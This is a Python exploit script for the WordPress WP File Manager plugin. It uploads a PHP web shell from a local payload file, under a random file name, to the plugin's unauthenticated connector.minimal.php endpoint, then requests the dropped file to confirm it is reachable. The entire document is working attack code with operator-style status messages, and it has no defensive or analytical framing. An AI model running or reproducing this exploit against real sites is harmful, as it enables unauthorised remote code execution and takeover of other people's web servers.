import requests
import random
import string
import os

def random_filename(ext='php'):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + f'.{ext}'

def exploit(site_url, payload_path='payloads/simple_shell.php'):
    print(f"[*] Targeting WP File Manager: {site_url}")

    try:
        upload_url = f"{site_url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        shell_name = random_filename()
        full_payload_path = os.path.abspath(payload_path)

        if not os.path.exists(full_payload_path):
            print(f"[x] Payload not found at: {full_payload_path}")
            return False, None

        files = {
            'upload[]': (shell_name, open(full_payload_path, 'rb'), 'application/x-php')
        }

        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Referer': site_url
        }

        print(f"[>] Uploading shell as: {shell_name}")
        r = requests.post(upload_url, files=files, headers=headers, timeout=10)

        if r.status_code == 200:
            shell_url = f"{site_url}/wp-content/plugins/wp-file-manager/lib/files/{shell_name}"
            # Confirm it’s actually uploaded
            check = requests.get(shell_url, headers=headers, timeout=10)

            if check.status_code == 200:
                print(f"[✔] Upload successful! Shell dropped at: {shell_url}")
                return True, shell_url
            else:
                print(f"[x] Upload may have failed, shell not found: HTTP {check.status_code}")
        else:
            print(f"[x] Upload failed, server responded with: HTTP {r.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Error during exploit: {e}")

    print("[-] WP File Manager exploit failed.")
    return False, None
